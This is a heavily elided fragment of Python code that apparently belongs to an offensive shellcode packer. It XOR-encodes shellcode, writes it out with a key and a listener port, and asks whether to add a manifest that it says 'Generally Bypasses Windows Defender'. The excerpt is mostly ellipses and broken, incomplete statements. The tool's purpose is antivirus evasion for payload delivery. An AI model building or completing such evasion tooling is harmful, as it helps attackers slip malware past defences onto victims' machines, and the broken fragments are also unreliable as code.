...
def xor(data, key):
	...
	return bytes(bytearray(((data[i] ^ keyAsInt[i % l]) 
...
""",'blue'))
	...
	writetofile(transformedShellcode, masterKey, 'xor',lport)
	...
	bypassWindows = input(color('[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ 1 or 0 ]?'))
	# Display Results
	print color("\n==================================== RESULT ====================================\n")
	if (bypassWindows):
